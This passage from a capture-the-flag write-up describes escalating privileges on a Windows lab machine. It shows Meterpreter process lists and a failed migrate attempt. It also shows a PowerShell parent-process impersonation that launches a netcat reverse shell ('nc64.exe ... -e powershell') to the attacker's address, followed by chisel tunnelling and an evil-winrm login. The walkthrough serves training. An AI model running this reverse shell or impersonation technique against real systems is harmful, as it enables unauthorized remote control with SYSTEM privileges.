 380   372   csrss.exe          x64   0
 484   372   wininit.exe        x64   0
 492   476   csrss.exe          x64   1
 552   476   winlogon.exe       x64   1                      C:\Windows\System32\winlogon.exe
 624   484   services.exe       x64   0
 644   484   lsass.exe          x64   0                      C:\Windows\System32\lsass.exe
 724   624   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
```


Even though I read a few blogs and saw that people abused this privilege by simply migrating to an elevated process my `Meterpreter` session just kept on dying.

```shell
 3160  608   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 3188  2240  powershell.exe     x64   0        POV\alaading  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 3372  3188  conhost.exe        x64   0        POV\alaading  C:\Windows\System32\conhost.exe
 3452  2920  w3wp.exe           x64   0                      C:\Windows\System32\inetsrv\w3wp.exe
 3512  608   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 3860  608   dllhost.exe        x64   0                      C:\Windows\System32\dllhost.exe
 3888  3188  lol.exe            x64   0        POV\alaading  C:\ProgramData\lol.exe
 3984  2496  fontdrvhost.exe    x64   2                      C:\Windows\System32\fontdrvhost.exe
 4080  804   conhost.exe        x64   0                      C:\Windows\System32\conhost.exe
 4092  3636  csrss.exe          x64   2
 4212  768   WmiPrvSE.exe       x64   0                      C:\Windows\System32\wbem\WmiPrvSE.exe
 4356  608   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 4432  608   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 4472  768   WmiPrvSE.exe       x64   0                      C:\Windows\System32\wbem\WmiPrvSE.exe
 4672  2496  dwm.exe            x64   2                      C:\Windows\System32\dwm.exe
 4772  3188  lol.exe            x64   0        POV\alaading  C:\ProgramData\lol.exe
 4848  2476  vm3dservice.exe    x64   2                      C:\Windows\System32\vm3dservice.exe
 4992  608   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 5060  608   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe

(Meterpreter 2)(C:\programdata) > migrate 3160
[*] Migrating from 4772 to 3160...

[*] 10.129.230.183 - Meterpreter session 2 closed.  Reason: Died
```


Oh well.... 


#### Failure 2

I'm going to try a different method by running this powershell script.

[psgetsys.ps1](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

I'll transfer this script over along with a netcat executable. Pick an elevated process and execute the script.

Description:
```powershell
#Simple powershell/C# to spawn a process under a different parent process 
#usage: ipmo psgetsys.ps1;  ImpersonateFromParentPid -ppid <parent pid> -command <command to execute> -cmdargs <command arguments>
```


```powershell
PS C:\programdata> import-module .\psgetsys.ps1
import-module .\psgetsys.ps1
PS C:\programdata> ImpersonateFromParentPid -ppid 2496 -command "c:\windows\system32\cmd.exe"  -cmdargs "/c c:\programdata\nc64.exe 10.10.14.221 4443 -e powershell"
ImpersonateFromParentPid -ppid 2496 -command "c:\windows\system32\cmd.exe"  -cmdargs "/c c:\programdata\nc64.exe 10.10.14.221 4443 -e powershell"
[+] Got Handle for ppid: 2496
[+] Updated proc attribute list
[+] Starting c:\windows\system32\cmd.exe /c c:\programdata\nc64.exe 10.10.14.221 4443 -e powershell...True - pid: 964 - Last error: 122
```


This also did not work. Not sure what is going on. I'm going to next try it over winrm.


#### Shell!

- Port 5985 is available

```shell
C:\programdata>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       876
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       472
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1184
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1440
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       608
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       628
  TCP    10.129.230.183:139     0.0.0.0:0              LISTENING       4
  TCP    10.129.230.183:49672   10.10.14.221:443       ESTABLISHED     372
  TCP    10.129.230.183:49673   10.10.14.221:9001      ESTABLISHED     2240
  TCP    10.129.230.183:49677   10.10.14.221:1337      ESTABLISHED     3768
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       876
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       472
  TCP    [::]:49665             [::]:0                 LISTENING       1184
  TCP    [::]:49666             [::]:0                 LISTENING       1440
  TCP    [::]:49667             [::]:0                 LISTENING       608
  TCP    [::]:49668             [::]:0                 LISTENING       628
  UDP    0.0.0.0:123            *:*                                    2488
  UDP    0.0.0.0:5353           *:*                                    1512
  UDP    0.0.0.0:5355           *:*                                    1512
  UDP    10.129.230.183:137     *:*                                    4
  UDP    10.129.230.183:138     *:*                                    4
  UDP    127.0.0.1:50553        *:*                                    2536
  UDP    [::]:123               *:*                                    2488
  UDP    [::]:5353              *:*                                    1512
  UDP    [::]:5355              *:*                                    1512
```

Now let's get a `winrm` shell with the user `alaading`. I'm going to use [chisel](https://github.com/jpillora/chisel) to create a tunnel in order to log in over `winrm`.


![EvilWinRM](/images/pov/evinwinrm.png)

I was finally able to get the powershell script to work!


![NTAuthority](/images/pov/ntauthority.png)


## 📓 Lessons Learned

I'm not sure why my `meterpreter` shell kept on dying whenever I tried to migrate to another process as `alaading`? I'm using the newest edition of `Parrot OS`. If someone reading this knows why feel free to reach out. Something else I would have done differently is I would have just port forwarded to the `winrm` port 5985 instead of using `proxychains` which is unstable. Since I'm not trying to access the other ports the method I used with proxychains was unnecessary. I could have also used `ligolo-ng` which is a better option than `chisel`.

